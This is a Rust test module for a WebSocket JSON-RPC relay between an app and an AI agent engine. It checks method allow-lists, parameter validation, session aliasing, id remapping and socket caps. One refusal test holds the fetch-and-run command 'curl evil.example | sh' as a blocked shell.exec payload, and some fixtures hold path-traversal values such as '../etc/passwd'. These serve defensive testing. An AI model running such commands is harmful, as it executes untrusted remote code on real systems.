        // Byte-for-byte: the block is already in the text, so there is nothing to add — the
        // workbook has two sheets, hence two headers, and neither may grow a third.
        assert_eq!(
            text_again, text,
            "a resent prompt must not duplicate the block: {text_again:?}"
        );

        // Nothing else changes: an image reference, a path outside the host, and a plain prompt
        // all travel byte-for-byte.
        for (offset, text) in [
            "@file:/var/tmp/shot.png\n\nlook".to_string(),
            format!("@file:{}\n\nlook", outside.join("secret.xlsx").display()),
            "@file:relative/budget.xlsx\n\nlook".to_string(),
            "just words".to_string(),
        ]
        .into_iter()
        .enumerate()
        {
            let action = client(
                &state,
                &json!({"jsonrpc": "2.0", "id": 3 + offset as u64, "method": "prompt.submit",
                        "params": {"session_id": "s-1", "text": text}}),
            );
            assert!(
                matches!(action, ClientAction::Forward(None)),
                "this prompt must travel untouched"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
        let _ = std::fs::remove_dir_all(&outside);
    }

    /// `test_methods_outside_the_allow_list_never_reach_the_gateway`.
    #[test]
    fn a_method_outside_the_allow_list_is_refused_with_the_python_error_shape() {
        let state = ConnectionState::new();
        let (id, code, message) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 7, "method": "shell.exec",
                    "params": {"command": "curl evil.example | sh"}}),
        ));
        assert_eq!(id, json!(7), "the client's own id is echoed");
        assert_eq!(code, -32601);
        assert!(
            message.contains("not allowed by bridge"),
            "the message must say what refused it: {message}"
        );
        assert!(lock(&state.pending).is_empty(), "a refusal is never in flight");

        // The guarded methods are not reachable just because they look like the rest.
        for method in ["image.attach", "pdf.attach", "vault.read", "tools.configure", "cli.exec"] {
            let (_, code, _) = refusal(client(
                &state,
                &json!({"jsonrpc": "2.0", "id": 8, "method": method, "params": {}}),
            ));
            assert_eq!(code, -32601, "{method} must not be reachable");
        }
        // An invalid name is refused too, with the Python "invalid method" wording.
        let (_, code, message) =
            refusal(client(&state, &json!({"jsonrpc": "2.0", "id": 9, "method": "no spaces here"})));
        assert_eq!(code, -32601);
        assert_eq!(message, "invalid method");
    }

    /// `policy.py:140-146` — presence on the list is not enough for the skills hub.
    #[test]
    fn skills_manage_is_read_only_and_profiles_configure_is_narrow() {
        let state = ConnectionState::new();
        let allowed = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 1, "method": "skills.manage",
                    "params": {"action": "list", "profile": "atlas"}}),
        );
        // Re-serialized rather than byte-forwarded: the frame is where a learned dialect drops
        // `session_id`, so every `skills.manage` request travels as a shaped object.
        assert_eq!(forwarded(allowed)["params"], json!({"action": "list", "profile": "atlas"}));

        for params in [
            json!({"action": "install", "profile": "atlas"}),
            json!({"action": "list", "profile": "atlas", "path": "/etc"}),
            json!({"action": "browse"}),
            json!({"action": 5}),
            json!({"action": "list", "session_id": ""}),
            json!({"action": "search", "query": 7}),
            json!({"action": "search", "page": -1}),
        ] {
            let (_, code, _) = refusal(client(
                &state,
                &json!({"jsonrpc": "2.0", "id": 2, "method": "skills.manage", "params": params}),
            ));
            assert_eq!(code, -32601);
        }

        let allowed = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 3, "method": "profiles.configure",
                    "params": {"name": "atlas", "model": "m", "provider": "p"}}),
        );
        assert!(matches!(allowed, ClientAction::Forward(None)));

        for params in [
            json!({"name": "atlas", "ui_meta": {"x": 1}}),
            json!({"name": "atlas", "model": "m"}),
            json!({"name": "", "soul": "x"}),
            json!({"name": "atlas", "soul": "x".repeat(64_001)}),
            json!({"name": "atlas", "enabled_mcp_servers": ["../etc/passwd"]}),
            json!({"name": "atlas", "confirm_expensive_model": true}),
        ] {
            let (_, code, _) = refusal(client(
                &state,
                &json!({"jsonrpc": "2.0", "id": 4, "method": "profiles.configure",
                        "params": params}),
            ));
            assert_eq!(code, -32601, "params {params} must be refused");
        }
    }

    /// Our patched engine: `session_id` travels, the reply is not an error, and the relay records
    /// that this engine takes the session-scoped shape — so a later call keeps sending it.
    #[test]
    fn skills_manage_keeps_session_id_for_a_patched_engine() {
        let state = ConnectionState::new();
        let request = json!({"jsonrpc": "2.0", "id": 41, "method": "skills.manage",
                             "params": {"action": "list", "profile": "cody", "session_id": "s-1"}});
        let first = forwarded(client(&state, &request));
        assert_eq!(first["params"]["session_id"], "s-1", "the patched shape must travel");
        assert!(lock(&state.skills_pending).contains_key(&RpcId::Int(41)));

        // The engine's success reply: swallowed of nothing, forwarded, and learned from.
        let action = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 41,
                            "result": {"skills": {"testing": ["signin"]}}})),
        );
        assert!(action.to_client.is_none(), "a normal reply is forwarded untouched");
        assert!(!action.swallow);
        assert!(lock(&state.skills_pending).is_empty(), "settled");
        assert_eq!(
            state.skills.session(),
            crate::skills_dialect::SessionShape::SessionScoped
        );

        let again = forwarded(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 42, "method": "skills.manage",
                    "params": {"action": "list", "profile": "cody", "session_id": "s-2"}}),
        ));
        assert_eq!(again["params"]["session_id"], "s-2", "no regression on our own engine");
    }

    /// A stock engine answers `session_id` with 4000. The app never sees that: the relay re-sends
    /// the same id without the field, remembers the dialect, and omits it from then on.
    #[test]
    fn a_rejected_session_id_is_retried_without_it_and_remembered() {
        let state = ConnectionState::new();
        let first = forwarded(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 51, "method": "skills.manage",
                    "params": {"action": "list", "profile": "cody", "session_id": "s-1"}}),
        ));
        assert_eq!(first["params"]["session_id"], "s-1");

        let retry = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 51,
                            "error": {"code": 4000,
                                      "message": "session_id: Extra inputs are not permitted"}})),
        );
        assert!(retry.swallow, "the app must not see the contract error");
        assert!(retry.to_client.is_none());
        let sent: Value = serde_json::from_str(&retry.to_engine.expect("a retry goes upstream")).unwrap();
        assert_eq!(sent["id"], json!(51), "the retry keeps the request id");
        assert_eq!(sent["method"], "skills.manage");
        assert_eq!(
            sent["params"],
            json!({"action": "list", "profile": "cody"}),
            "only session_id is dropped, and profile survives"
        );

        // The retry succeeds; the dialect is remembered for the process.
        let settled = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 51, "result": {"skills": {}}})),
        );
        assert!(settled.to_client.is_none());
        assert_eq!(
            state.skills.session(),
            crate::skills_dialect::SessionShape::ProfileOnly
        );

        // A later request omits it before the engine ever has to refuse again.
        let next = forwarded(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 52, "method": "skills.manage",
                    "params": {"action": "list", "profile": "cody", "session_id": "s-2"}}),
        ));
        assert!(
            !next.to_string().contains("session_id"),
            "remembered dialect must shape the frame: {next}"
        );
        assert_eq!(next["params"]["profile"], "cody");
    }

    /// A stock engine's `search` handler raises 5024. The page must still render: an empty,
    /// flagged result instead of an error, and no repeated round trips afterwards.
    #[test]
    fn a_broken_search_degrades_to_an_empty_result_instead_of_an_error() {
        let state = ConnectionState::new();
        let first = forwarded(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 61, "method": "skills.manage",
                    "params": {"action": "search", "query": "pdf", "session_id": "s-1"}}),
        ));
        assert_eq!(first["params"]["query"], "pdf");

        let degraded = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 61,
                            "error": {"code": 5024,
                                      "message": "'SkillMeta' object has no attribute 'describe'"}})),
        );
        assert!(!degraded.swallow, "the degraded answer replaces the error");
        let shown: Value = serde_json::from_str(&degraded.to_client.expect("the app is answered")).unwrap();
        assert_eq!(shown["id"], json!(61));
        assert_eq!(shown["result"]["results"], json!([]));
        assert_eq!(shown["result"]["degraded"], true);

        // The next search is answered locally: no forward, no engine error.
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 62, "method": "skills.manage",
                    "params": {"action": "search", "query": "meeting"}}),
        ) {
            ClientAction::Answer(frame) => {
                assert_eq!(frame["result"]["results"], json!([]));
                assert_eq!(frame["id"], json!(62));
            }
            _ => panic!("a known-broken search must not be forwarded"),
        }

        // A list is unaffected: the search verdict must not disable the Skills page itself.
        let list = forwarded(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 63, "method": "skills.manage",
                    "params": {"action": "list", "profile": "cody"}}),
        ));
        assert_eq!(list["params"]["action"], "list");
    }

    /// test_bad_json_gets_a_parse_error_and_keeps_the_socket.
    #[test]
    fn a_parse_error_is_answered_and_does_not_end_the_socket() {
        let state = ConnectionState::new();
        let (id, code, _) = refusal(process_client_frame(&state, "{not json"));
        assert_eq!(id, Value::Null);
        assert_eq!(code, -32700);
        let next = client(&state, &json!({"jsonrpc": "2.0", "id": 11, "method": "ping"}));
        assert!(matches!(next, ClientAction::Forward(None)));
    }

    /// `test_client_capabilities_cannot_narrow_what_the_bridge_answers`.
    #[test]
    fn a_client_capabilities_request_cannot_narrow_server_requests() {
        let state = ConnectionState::new();
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 2, "method": "client.capabilities",
                    "params": {"server_requests": ["approval"]}}),
        ) {
            ClientAction::Forward(Some(wire)) => {
                let frame: Value = serde_json::from_str(&wire).unwrap();
                assert_eq!(frame["params"]["server_requests"], json!(true));
                assert_eq!(frame["id"], json!(2));
            }
            _ => panic!("the capabilities request must be rewritten and forwarded"),
        }
        // No params at all still declares the capability.
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 3, "method": "client.capabilities"}),
        ) {
            ClientAction::Forward(Some(wire)) => {
                let frame: Value = serde_json::from_str(&wire).unwrap();
                assert_eq!(frame["params"], json!({"server_requests": true}));
            }
            _ => panic!("params must be added"),
        }
    }

    /// `test_client_request_cannot_reuse_a_pending_server_request_id`.
    #[test]
    fn a_client_request_cannot_reuse_an_id_a_server_request_holds() {
        let state = ConnectionState::new();
        lock(&state.server_requests).insert(RpcId::Str("srq-21".into()), json!("srq-21"));
        let (_, code, message) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": "srq-21", "method": "ping"}),
        ));
        assert_eq!(code, -32600);
        assert!(message.contains("in use"));
        assert!(
            lock(&state.server_requests).contains_key(&RpcId::Str("srq-21".into())),
            "the engine's request must survive the refusal"
        );

        // A duplicate of an in-flight client id is refused the same way the Python does.
        let first = client(&state, &json!({"jsonrpc": "2.0", "id": 5, "method": "ping"}));
        assert!(matches!(first, ClientAction::Forward(None)));
        let (_, code, message) =
            refusal(client(&state, &json!({"jsonrpc": "2.0", "id": 5, "method": "ping"})));
        assert_eq!(code, -32600);
        assert!(message.contains("duplicate"));
    }

    /// `test_unsupported_server_request_is_declined_upstream`, adjusted for this app.
    ///
    /// The Python list was the retired bridge's six capabilities. The shipping clients answer more —
    /// `preview.act`, theme cards, onboarding `setup_beat`, tours, window reads — so an *unlisted but
    /// well-formed* method must reach the app; only a malformed name is declined here. Gating on the six
    /// did not protect anything (the engine is trusted) and silently disabled those features.
    #[test]
    fn an_unlisted_server_request_reaches_the_app_and_only_a_malformed_one_is_declined() {
        let state = ConnectionState::new();
        let forwarded = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": "srq-9", "method": "preview.act", "params": {}})),
        );
        assert!(forwarded.to_client.is_some(), "preview.act must reach the app");
        assert!(forwarded.to_engine.is_none(), "nothing is declined upstream");

        let malformed = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": "srq-10", "method": "not a method", "params": {}})),
        );
        assert!(malformed.swallow, "the app must not see it");
        assert!(malformed.to_client.is_none());
        let decline: Value =
            serde_json::from_str(&malformed.to_engine.expect("an answer goes upstream")).unwrap();
        assert_eq!(decline["id"], json!("srq-10"));
        assert_eq!(decline["error"]["code"], json!(-32601));
        assert!(decline.get("method").is_none());
    }

    /// `test_approval_server_request_round_trips` and the parametrised
    /// `test_each_supported_server_request_is_forwarded`.
    #[test]
    fn every_supported_server_request_round_trips_under_its_own_id() {
        for method in SERVER_REQUEST_METHODS {
            let state = ConnectionState::new();
            let action = process_engine_frame(
                &state,
                &encode(&json!({"jsonrpc": "2.0", "id": "srq-7", "method": method, "params": {}})),
            );
            assert!(!action.swallow, "{method} must reach the app");
            let shown: Value = serde_json::from_str(&action.to_client.unwrap()).unwrap();
            assert_eq!(shown["method"], json!(method));
            assert_eq!(shown["id"], json!("srq-7"));

            let routed = process_client_frame(
                &state,
                &encode(&json!({"jsonrpc": "2.0", "id": "srq-7", "result": {"choice": "once"}})),
            );
            match routed {
                ClientAction::Forward(Some(wire)) => {
                    let back: Value = serde_json::from_str(&wire).unwrap();
                    assert_eq!(back["id"], json!("srq-7"));
                    assert_eq!(back["result"], json!({"choice": "once"}));
                }
                _ => panic!("{method}'s answer must be routed upstream"),
            }
            assert!(lock(&state.server_requests).is_empty(), "the mapping is consumed");
        }
    }

    /// `test_server_request_id_collision_is_remapped_and_restored`.
    #[test]
    fn a_server_request_id_collision_is_remapped_and_restored() {
        let state = ConnectionState::new();
        let ping = client(&state, &json!({"jsonrpc": "2.0", "id": 5, "method": "ping"}));
        assert!(matches!(ping, ClientAction::Forward(None)));

        let request = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 5, "method": "approval", "params": {}})),
        );
        let shown: Value = serde_json::from_str(&request.to_client.unwrap()).unwrap();
        assert_eq!(shown["id"], json!("brq-1"));
        assert_eq!(shown["method"], json!("approval"));

        let answer = process_client_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": "brq-1", "result": {"choice": "deny"}})),
        );
        match answer {
            ClientAction::Forward(Some(wire)) => {
                let back: Value = serde_json::from_str(&wire).unwrap();
                assert_eq!(back["id"], json!(5), "the engine's id is restored");
                assert_eq!(back["result"], json!({"choice": "deny"}));
            }
            _ => panic!("the answer must be routed under the engine's id"),
        }

        // The client's own pending ping still answers under its own id.
        let pong = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 5, "result": {"pong": true}})),
        );
        assert!(pong.to_client.is_none(), "not oversized, not paging");
        assert!(!pong.swallow);
    }

    /// `test_client_response_with_unknown_id_is_dropped`.
    #[test]
    fn a_client_response_to_an_unknown_id_is_dropped() {
        let state = ConnectionState::new();
        let action = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": "srq-nope", "result": {}}),
        );
        assert!(matches!(action, ClientAction::Drop));
    }

    /// `test_ready_is_relayed_and_capabilities_injected_once`.
    #[test]
    fn the_relay_asks_the_engine_for_server_requests_once_after_ready() {
        let state = ConnectionState::new();
        let ready = encode(&json!({"jsonrpc": "2.0", "method": "event",
                                   "params": {"type": "gateway.ready"}}));
        let first = process_engine_frame(&state, &ready);
        assert!(!first.swallow, "gateway.ready itself must reach the app");
        assert!(first.send_caps);
        let second = process_engine_frame(&state, &ready);
        assert!(!second.send_caps, "the handshake happens once per connection");
        // Some other event is not a handshake.
        let state = ConnectionState::new();
        let other = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "method": "event",
                            "params": {"type": "message.delta"}})),
        );
        assert!(!other.send_caps);
    }

    /// `test_ready_is_relayed_and_capabilities_injected_once` — the relay's own answer is consumed.
    #[test]
    fn the_relays_own_capability_answer_is_swallowed() {
        let state = ConnectionState::new();
        let action = process_engine_frame(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": BRIDGE_CAPABILITIES_ID,
                            "result": {"server_requests": true}})),
        );
        assert!(action.swallow);
        assert!(action.to_client.is_none());
    }

    /// `test_a_resume_keeps_the_id_it_names` and `test_a_resume_rekeys_the_session_and_later_frames_follow`.
    #[test]
    fn a_resume_aliases_the_runtime_id_and_later_frames_follow_but_a_resume_does_not() {
        let state = ConnectionState::new();
        let stored = "20261103_160159_c329ba";
        let fresh = "20261103_1602_77aa01";

        let resume = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 51, "method": "session.resume",
                    "params": {"session_id": stored, "profile": "atlas"}}),
        );
        assert!(matches!(resume, ClientAction::Forward(None)), "the first resume goes as written");
        let reply = json!({"jsonrpc": "2.0", "id": 51, "result": {
            "session_id": fresh, "stored_session_id": stored, "messages": transcript(2),
        }});
        inspect_engine_text(&state, &encode(&reply));

        // A later call still naming the stored id is rewritten before dispatch.
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 42, "method": "session.title",
                    "params": {"session_id": stored, "title": "x"}}),
        ) {
            ClientAction::Forward(Some(wire)) => {
                let frame: Value = serde_json::from_str(&wire).unwrap();
                assert_eq!(frame["params"]["session_id"], json!(fresh));
                assert_eq!(frame["params"]["title"], json!("x"));
            }
            _ => panic!("the follow-up frame must be rewritten"),
        }

        // A resume is exempt: it names the stored id it means, and that must arrive unchanged or
        // the 2026-11-17 bug returns.
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 52, "method": "session.resume",
                    "params": {"session_id": stored, "profile": "atlas"}}),
        ) {
            ClientAction::Forward(None) => {}
            _ => panic!("a resume must never be rewritten to the previous attach's runtime id"),
        }
        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 53, "method": "session.create",
                    "params": {"session_id": stored}}),
        ) {
            ClientAction::Forward(None) => {}
            _ => panic!("session.create establishes a session and is exempt too"),
        }
    }

    /// The alias must not cost "load earlier": the cache is keyed to the stored id, the paging
    /// request is rewritten to the runtime id, so both keys must be present.
    #[test]
    fn a_history_page_still_answers_after_the_session_is_aliased() {
        let state = ConnectionState::new();
        let stored = "stored-session";
        let fresh = "runtime-session";
        client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 60, "method": "session.resume",
                    "params": {"session_id": stored, "profile": "bot"}}),
        );
        let reply = json!({"jsonrpc": "2.0", "id": 60, "result": {
            "session_id": fresh, "messages": transcript(400),
        }});
        inspect_engine_text(&state, &encode(&reply));

        match client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 61, "method": "session.history",
                    "params": {"session_id": stored, "profile": "bot", "cursor": 200, "limit": 150}}),
        ) {
            ClientAction::Answer(frame) => {
                assert_eq!(frame["id"], json!(61));
                let page = frame["result"]["messages"].as_array().unwrap();
                assert_eq!(page.len(), 150);
                assert_eq!(page[0]["id"], json!("m050"));
                assert_eq!(frame["result"]["total"], json!(400));
            }
            _ => panic!("an older page must still be answered after an alias"),
        }
    }

    /// If a resume arrives with no `session_id` in its result, no alias is invented.
    #[test]
    fn a_resume_reply_without_a_new_session_id_creates_no_alias() {
        let state = ConnectionState::new();
        client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 70, "method": "session.resume",
                    "params": {"session_id": "s1"}}),
        );
        inspect_engine_text(
            &state,
            &encode(&json!({"jsonrpc": "2.0", "id": 70, "result": {"messages": transcript(2)}})),
        );
        assert!(lock(&state.aliases).is_empty());
        assert!(matches!(
            client(&state, &json!({"jsonrpc": "2.0", "id": 71, "method": "session.title",
                                   "params": {"session_id": "s1"}})),
            ClientAction::Forward(None)
        ));
    }

    // -- frame cap ---------------------------------------------------------------------------

    #[test]
    fn a_frame_over_the_cap_is_refused_and_a_batch_is_split_into_frames() {
        let cap = 4096;
        let big = "a".repeat(cap + 1);
        assert_eq!(split_frames(&big, cap), Err("frame_too_large"));
        // Measured in UTF-8 bytes, not characters: 2000 two-byte characters is 4000 bytes.
        let wide = "é".repeat(2100);
        assert_eq!(split_frames(&wide, cap), Err("frame_too_large"));

        let batch = format!("{{\"id\":1}}\n{{\"id\":2}}\r\n\n{{\"id\":3}}");
        let frames = split_frames(&batch, cap).expect("a batch is legal");
        assert_eq!(frames, vec!["{\"id\":1}", "{\"id\":2}", "{\"id\":3}"]);

        let too_many = (0..=MAX_FRAMES_PER_MESSAGE)
            .map(|_| "{}")
            .collect::<Vec<_>>()
            .join("\n");
        assert_eq!(
            split_frames(&too_many, cap),
            Err("frame_batch_too_large"),
            "a half-million one-byte lines must not each become a parse error"
        );
    }

    // -- live registry -----------------------------------------------------------------------

    #[test]
    fn closing_a_device_reaches_only_that_devices_sockets() {
        let registry = Registry::default();
        let (a1_tx, mut a1_rx) = mpsc::channel(8);
        let (a2_tx, mut a2_rx) = mpsc::channel(8);
        let (b_tx, mut b_rx) = mpsc::channel(8);
        let a1 = registry.register("device-a", a1_tx);
        let a2 = registry.register("device-a", a2_tx);
        let _b = registry.register("device-b", b_tx);
        assert_eq!(registry.count("device-a"), 2);
        assert_eq!(registry.total(), 3);

        assert_eq!(registry.close_device("device-a"), 2);
        assert_eq!(a1_rx.try_recv(), Ok(Control::Close(CLOSE_DEVICE_REVOKED, "device_revoked".into())));
        assert_eq!(a2_rx.try_recv(), Ok(Control::Close(CLOSE_DEVICE_REVOKED, "device_revoked".into())));
        assert!(b_rx.try_recv().is_err(), "another device's socket must not be touched");
        assert_eq!(registry.count("device-a"), 0);
        assert_eq!(registry.count("device-b"), 1);

        // A late unregister from the exited socket is harmless.
        registry.unregister("device-a", a1);
        registry.unregister("device-a", a2);
        assert_eq!(registry.close_device("device-a"), 0);
    }

    // -- socket caps ---------------------------------------------------------------------------

    /// `proxy.py:226-241` — four sockets per device, and a fifth *evicts* instead of being refused:
    /// a client whose old socket is a zombie (half-open, no FIN yet) would otherwise be locked out
    /// of its own device until the zombie timed out.
    #[test]
    fn the_per_device_cap_keeps_the_newest_sockets_and_evicts_the_longest_idle_one() {
        let registry = Registry::default();
        let mut sockets = Vec::new();
        for _ in 0..MAX_SOCKETS_PER_DEVICE {
            let (tx, rx) = mpsc::channel(8);
            let (id, activity) = registry.register_capped("device-a", tx).expect("room");
            sockets.push((id, rx, activity));
        }
        assert_eq!(registry.count("device-a"), MAX_SOCKETS_PER_DEVICE);

        let (tx, _rx) = mpsc::channel(8);
        registry
            .register_capped("device-a", tx)
            .expect("the cap evicts rather than refuses");
        assert_eq!(
            sockets[0].1.try_recv(),
            Ok(Control::Close(CLOSE_EVICTED, "device_cap".into())),
            "the oldest socket is the one evicted"
        );
        for (index, socket) in sockets.iter_mut().enumerate().skip(1) {
            assert!(
                socket.1.try_recv().is_err(),
                "socket {index} was cut while an older idle one existed"
            );
        }
        assert_eq!(
            registry.count("device-a"),
            MAX_SOCKETS_PER_DEVICE,
            "the newest four sockets are the ones left"
        );

        // The oldest survivor is the one that is *delivering*: it must not be next. Only its
        // activity separates it from the idle socket beside it.
        note_activity(&Some(sockets[1].2.clone()));
        let (tx, _rx) = mpsc::channel(8);
        registry.register_capped("device-a", tx).expect("evicted");
        assert!(
            sockets[1].1.try_recv().is_err(),
            "a socket that just carried a frame must survive an idle one"
        );
        assert_eq!(
            sockets[2].1.try_recv(),
            Ok(Control::Close(CLOSE_EVICTED, "device_cap".into())),
            "the longest-idle socket goes instead"
        );
    }

    /// A device at its cap must not evict another device's sockets to make room for itself.
    #[test]
    fn eviction_at_the_cap_only_touches_the_device_that_is_at_its_cap() {
        let registry = Registry::default();
        let mut a = Vec::new();
        for _ in 0..MAX_SOCKETS_PER_DEVICE {
            let (tx, rx) = mpsc::channel(8);
            registry.register_capped("device-a", tx).expect("room");
            a.push(rx);
        }
        let (b1_tx, mut b1_rx) = mpsc::channel(8);
        let (b2_tx, mut b2_rx) = mpsc::channel(8);
        registry.register_capped("device-b", b1_tx).expect("room");
        registry.register_capped("device-b", b2_tx).expect("room");

        // `admit` is what the upgrade path calls; `register_capped` is what the relay calls. Both
        // must reach only device-a.
        registry.admit("device-a").expect("evicted");
        let (tx, _rx) = mpsc::channel(8);
        registry.register_capped("device-a", tx).expect("room by eviction");

        assert_eq!(a.remove(0).try_recv(), Ok(Control::Close(CLOSE_EVICTED, "device_cap".into())));
        assert!(b1_rx.try_recv().is_err(), "device-b's socket must not be evicted");
        assert!(b2_rx.try_recv().is_err(), "device-b's socket must not be evicted");
        assert_eq!(registry.count("device-b"), 2);
        assert_eq!(registry.total(), MAX_SOCKETS_PER_DEVICE + 2);
    }

    /// Over the global cap the host evicts the longest-idle socket anywhere, rather than refusing
    /// the newcomer that would otherwise never get in while every device sits at its own cap.
    #[test]
    fn the_global_cap_evicts_the_longest_idle_socket_on_the_host() {
        let registry = Registry::default();
        let devices = MAX_SOCKETS_TOTAL / MAX_SOCKETS_PER_DEVICE;
        let mut receivers = Vec::new();
        for device in 0..devices {
            for _ in 0..MAX_SOCKETS_PER_DEVICE {
                let (tx, rx) = mpsc::channel(8);
                let device_id = format!("device-{device:02}");
                registry.register_capped(&device_id, tx).expect("room");
                receivers.push(rx);
            }
        }
        assert_eq!(registry.total(), MAX_SOCKETS_TOTAL);

        registry
            .admit("device-new")
            .expect("the global cap evicts rather than refuses");
        assert_eq!(
            receivers[0].try_recv(),
            Ok(Control::Close(CLOSE_EVICTED, "global_cap".into())),
            "the longest-idle socket on the host is the first one registered"
        );
        for (index, receiver) in receivers.iter_mut().enumerate().skip(1) {
            assert!(receiver.try_recv().is_err(), "socket {index} was evicted too");
        }
        assert_eq!(
            registry.count("device-00"),
            MAX_SOCKETS_PER_DEVICE - 1,
            "the drained device keeps its other sockets"
        );

        let (tx, _rx) = mpsc::channel(8);
        registry.register_capped("device-new", tx).expect("the freed slot is usable");
        assert_eq!(registry.total(), MAX_SOCKETS_TOTAL);
    }

    /// The invariant the caps exist to protect: an eviction never takes a device's last socket, and
    /// a socket that cannot be closed is refused an upgrade rather than cut mid-conversation.
    #[test]
    fn a_device_is_never_left_empty_by_an_eviction_or_its_own_upgrade() {
        let registry = Registry::default();
        let (tx, mut rx) = mpsc::channel(8);
        registry.register_capped("device-a", tx).expect("room");
        for _ in 0..3 {
            registry.admit("device-a").expect("under the cap nothing is evicted");
        }
        assert_eq!(registry.count("device-a"), 1);
        assert!(rx.try_recv().is_err(), "a device's only socket must never be cut");

        // The floor itself.
        let (tx, mut solo) = mpsc::channel(8);
        let mut slots = vec![Slot {
            id: 999,
            tx,
            activity: Arc::new(AtomicU64::new(1)),
        }];
        assert!(!evict_longest_idle(&mut slots, 1, "device_cap"));
        assert_eq!(slots.len(), 1);
        assert!(solo.try_recv().is_err());

        // No queue accepts a close (a relay task that is not draining), so nothing can be freed and
        // the newcomer is refused — the four existing conversations keep running.
        let registry = Registry::default();
        let mut keep = Vec::new();
        for _ in 0..MAX_SOCKETS_PER_DEVICE {
            let (tx, rx) = mpsc::channel::<Control>(1);
            tx.try_send(Control::Close(CLOSE_DEVICE_REVOKED, "noise".into()))
                .expect("the queue is empty");
            registry.register("device-a", tx);
            keep.push(rx);
        }
        assert_eq!(registry.admit("device-a"), Err(Refusal::PerDeviceCap));
        assert_eq!(registry.count("device-a"), MAX_SOCKETS_PER_DEVICE);
    }

    // -- real sockets ------------------------------------------------------------------------

    /// Serve `relay_guarded` exactly the way `routes.rs` does.
    async fn serve_relay(
        engine_url: String,
        device: Option<String>,
        registry: Registry,
        limits: Limits,
    ) -> (SocketAddr, tokio::task::JoinHandle<()>) {
        let app = axum::Router::new().route(
            "/ws",
            axum::routing::get(move |ws: WebSocketUpgrade| {
                let engine_url = engine_url.clone();
                let device = device.clone();
                let registry = registry.clone();
                async move {
                    ws.on_upgrade(move |socket| {
                        relay_guarded(socket, engine_url, None, device, registry, limits, None,
                                      PathBuf::new())
                    })
                }
            }),
        );
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        (addr, server)
    }

    /// Connect a fake engine listener and return it already accepting.
    async fn fake_engine(
        ready: bool,
    ) -> (
        SocketAddr,
        tokio::task::JoinHandle<()>,
        mpsc::UnboundedReceiver<String>,
    ) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (heard_tx, heard_rx) = mpsc::unbounded_channel::<String>();
        let engine = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            if ready {
                let frame = json!({"jsonrpc": "2.0", "method": "event",
                                   "params": {"type": "gateway.ready"}});
                let _ = ws.send(TgMsg::Text(encode(&frame).into())).await;
            }
            while let Some(Ok(msg)) = ws.next().await {
                if let TgMsg::Text(text) = msg {
                    let text = text.to_string();
                    heard_tx.send(text.clone()).ok();
                    let frame: Value = serde_json::from_str(&text).unwrap_or(Value::Null);
                    let method = frame.get("method").and_then(Value::as_str);
                    let reply = match method {
                        Some("ping") => Some(json!({"jsonrpc": "2.0", "id": frame["id"].clone(),
                                                   "result": {"pong": true}})),
                        Some("client.capabilities") => Some(json!({"jsonrpc": "2.0",
                                                                   "id": frame["id"].clone(),
                                                                   "result": {"server_requests": true}})),
                        _ => None,
                    };
                    if let Some(reply) = reply {
                        let _ = ws.send(TgMsg::Text(encode(&reply).into())).await;
                    }
                }
            }
        });
        (addr, engine, heard_rx)
    }

    /// A frame the *host* originates — a reaction another device changed — reaches an app socket
    /// on the same wire the engine's events use, without the engine having said anything.
    ///
    /// This is the path `reactions::put_reaction` relies on: `Registry::publish` fans out, the
    /// relay forwards, and the app sees one `method:"event"` frame it already knows how to decode.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_host_originated_frame_reaches_the_app_socket() {
        let (engine_addr, _engine, _heard) = fake_engine(false).await;
        let registry = Registry::default();
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            Some("device-a".to_string()),
            registry.clone(),
            Limits::default(),
        )
        .await;

        let (mut client, _) =
            tokio_tungstenite::connect_async(format!("ws://{addr}/ws")).await.unwrap();
        // The relay registers the socket before it dials the engine, so this is when a publish can
        // reach it.
        for _ in 0..200 {
            if registry.count("device-a") == 1 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        assert_eq!(registry.count("device-a"), 1, "the socket never attached");

        let line = crate::reactions::frame("cody", "20260101_000000_abcdef", "row:41", Some("👍"), "Mo's Mac");
        assert_eq!(registry.publish(line.clone()), 1, "one live socket, one frame");

        let heard = next_text(&mut client).await;
